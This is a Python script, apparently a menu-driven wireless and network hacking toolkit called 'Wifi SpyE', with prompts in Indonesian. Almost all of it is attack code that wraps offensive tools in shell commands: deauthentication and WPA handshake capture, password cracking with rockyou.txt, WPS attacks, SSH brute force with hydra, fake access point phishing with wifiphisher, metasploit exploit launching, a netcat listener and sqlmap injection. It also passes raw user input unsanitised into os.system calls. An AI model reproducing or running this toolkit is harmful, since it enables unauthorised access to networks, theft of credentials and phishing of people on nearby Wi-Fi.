#!/usr/bin/env python3
# -------------------------------------------------------------------------
# Tool Name   : Wifi SpyE
# Author      : SPY-E
# Dev.        : 123tool & SPY-E
# Description : Wireless & Network Wifi Hacking
# -------------------------------------------------------------------------

import os
import subprocess
from colorama import Fore, Style, init

# Inisialisasi warna untuk branding
init(autoreset=True)

def log_spy(msg): print(f"{Fore.CYAN}[SpyE] {Fore.WHITE}{msg}")
def log_warn(msg): print(f"{Fore.YELLOW}[!] {Fore.WHITE}{msg}")

def install_tools():
    log_spy("Menginstal Tools Pendukung...")
    tools = [
        "aircrack-ng", "crunch", "xterm", "wordlists", "reaver", "pixiewps", 
        "bully", "wifite", "airodump-ng", "nmap", "metasploit-framework", 
        "hydra", "wifiphisher", "nikto", "netcat", "gobuster", "ncat", "sqlmap"
    ]
    for tool in tools:
        cmd = f"sudo apt-get install -y {tool}"
        log_spy(f"Installing {tool}...")
        os.system(cmd)

def start_monitor_mode(interface):
    log_spy(f"Mengaktifkan Monitor Mode pada {interface}...")
    os.system(f"airmon-ng start {interface} && airmon-ng check kill")

def stop_monitor_mode(interface):
    log_spy(f"Menonaktifkan Monitor Mode pada {interface}...")
    os.system(f"airmon-ng stop {interface} && service network-manager restart")

def scan_networks(interface):
    log_spy(f"Scanning Jaringan menggunakan {interface}...")
    os.system(f"airodump-ng {interface} -M")

def get_handshake(interface, bssid, channel, path, packets):
    log_spy(f"Menangkap Handshake dari {bssid}...")
    os.system(f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {packets} -a {bssid} {interface}")

def crack_handshake_with_wordlist(handshake_path, wordlist_path):
    log_spy(f"Cracking Handshake: {handshake_path}...")
    os.system(f"aircrack-ng {handshake_path} -w {wordlist_path}")

def crack_handshake_without_wordlist(handshake_path, essid):
    log_spy(f"Cracking Handshake (Tanpa Wordlist) ESSID: {essid}...")
    os.system(f"aircrack-ng {handshake_path} -e {essid}")

def create_wordlist(min_length, max_length, characters, output_path):
    log_spy(f"Membuat Wordlist Custom di {output_path}...")
    os.system(f"crunch {min_length} {max_length} {characters} -o {output_path}")

def perform_wps_attack(interface, bssid):
    log_spy(f"Melakukan WPS Attack pada {bssid}...")
    os.system(f"reaver -i {interface} -b {bssid} -vv")

def scan_networks_with_nmap(target_ip):
    log_spy(f"Nmap Scan pada Target: {target_ip}...")
    os.system(f"nmap -sP {target_ip}")

def run_metasploit_exploit(exploit_name):
    log_spy(f"Inisialisasi Metasploit: {exploit_name}...")
    os.system(f"msfconsole -x 'use {exploit_name}; run'")

def perform_brute_force_login(target_ip, username, password_file):
    log_spy(f"Hydra Brute Force pada {target_ip}...")
    os.system(f"hydra -l {username} -P {password_file} {target_ip} ssh")

def perform_phishing_attack(interface, bssid):
    log_spy(f"Menyiapkan Phishing Page pada {bssid}...")
    os.system(f"wifiphisher -i {interface} --fakeap -b {bssid}")

def scan_web_server_with_nikto(target_url):
    log_spy(f"Nikto Vuln Scan: {target_url}...")
    os.system(f"nikto -h {target_url}")

def listen_with_netcat(port):
    log_spy(f"Mendengarkan pada Port {port}...")
    os.system(f"nc -lvp {port}")

def brute_force_directories(target_url):
    log_spy(f"Gobuster Directory Discovery: {target_url}...")
    os.system(f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")

def perform_sql_injection(target_url):
    log_spy(f"SQLMap Injection Attack pada {target_url}...")
    os.system(f"sqlmap -u {target_url} --batch")

def main():
    while True:
        banner = f"""
{Fore.CYAN}    ██╗    ██╗██╗███████╗██╗     ███████╗██████╗ ██╗   ██╗███████╗
{Fore.CYAN}    ██║    ██║██║██╔════╝██║     ██╔════╝██╔══██╗╚██╗ ██╔╝██╔════╝
{Fore.CYAN}    ██║ █╗ ██║██║█████╗  ██║     ███████╗██████╔╝ ╚████╔╝ █████╗  
{Fore.CYAN}    ██║███╗██║██║██╔══╝  ██║     ╚════██║██╔═══╝   ╚██╔╝  ██╔══╝  
{Fore.CYAN}    ╚███╔███╔╝██║██║     ██║     ███████║██║        ██║   ███████╗
{Fore.CYAN}     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝        ╚═╝   ╚══════╝
{Fore.WHITE}                      Advanced Wireless Auditor
{Fore.YELLOW}    -----------------------------------------------------------------
{Fore.WHITE}    Branding : {Fore.GREEN}123tool & SPY-E
{Fore.WHITE}    Team     : {Fore.RED}Indonesia OSINT
{Fore.YELLOW}    -----------------------------------------------------------------
    
    [ Menu Utama ]
    1) Aktifkan Monitor Mode       10) WPS Attack (Reaver)
    2) Matikan Monitor Mode        11) Nmap Network Scan
    3) Scan Jaringan (Airodump)    12) Metasploit Exploit
    4) Tangkap Handshake (WPA)     13) Hydra Brute Force
    5) Install Semua Tools         14) Phishing Attack (Wifiphisher)
    6) Crack (rockyou.txt)         15) Nikto Web Scan
    7) Crack (Custom Wordlist)     16) Netcat Listener
    8) Crack (Tanpa Wordlist)      17) Gobuster Directory
    9) Buat Wordlist (Crunch)      18) SQLMap Injection
    0) Keluar
    -----------------------------------------------------------------
"""
        print(banner)
        choice = input(f"{Fore.CYAN}SpyE > {Fore.WHITE}")

        if choice == '1':
            interface = input("Masukkan Interface: ")
            start_monitor_mode(interface)
        elif choice == '2':
            interface = input("Masukkan Interface: ")
            stop_monitor_mode(interface)
        elif choice == '3':
            interface = input("Masukkan Interface: ")
            scan_networks(interface)
        elif choice == '4':
            interface = input("Masukkan Interface: ")
            bssid = input("Target BSSID: ")
            channel = input("Channel: ")
            path = input("Path File Output: ")
            packets = input("Jumlah Packets: ")
            get_handshake(interface, bssid, channel, path, packets)
        elif choice == '5':
            install_tools()
        elif choice == '6':
            handshake_path = input("Path Handshake: ")
            crack_handshake_with_wordlist(handshake_path, "/usr/share/wordlists/rockyou.txt")
        elif choice == '7':
            handshake_path = input("Path Handshake: ")
            wordlist_path = input("Path Wordlist: ")
            crack_handshake_with_wordlist(handshake_path, wordlist_path)
        elif choice == '8':
            handshake_path = input("Path Handshake: ")
            essid = input("ESSID: ")
            crack_handshake_without_wordlist(handshake_path, essid)
        elif choice == '9':
            min_l = int(input("Min Length: "))
            max_l = int(input("Max Length: "))
            chars = input("Karakter: ")
            out_p = input("Path Output: ")
            create_wordlist(min_l, max_l, chars, out_p)
        elif choice == '10':
            interface = input("Interface: ")
            bssid = input("BSSID: ")
            perform_wps_attack(interface, bssid)
        elif choice == '11':
            ip = input("Target IP: ")
            scan_networks_with_nmap(ip)
        elif choice == '12':
            exploit = input("Nama Exploit: ")
            run_metasploit_exploit(exploit)
        elif choice == '13':
            ip = input("Target IP: ")
            user = input("Username: ")
            pass_f = input("Path Password File: ")
            perform_brute_force_login(ip, user, pass_f)
        elif choice == '14':
            interface = input("Interface: ")
            bssid = input("BSSID: ")
            perform_phishing_attack(interface, bssid)
        elif choice == '15':
            url = input("Target URL: ")
            scan_web_server_with_nikto(url)
        elif choice == '16':
            port = input("Port: ")
            listen_with_netcat(port)
        elif choice == '17':
            url = input("Target URL: ")
            brute_force_directories(url)
        elif choice == '18':
            url = input("Target URL: ")
            perform_sql_injection(url)
        elif choice == '0':
            log_spy("Exiting... Stay Safe!")
            break
        else:
            log_warn("Pilihan tidak valid.")

if __name__ == "__main__":
    main()
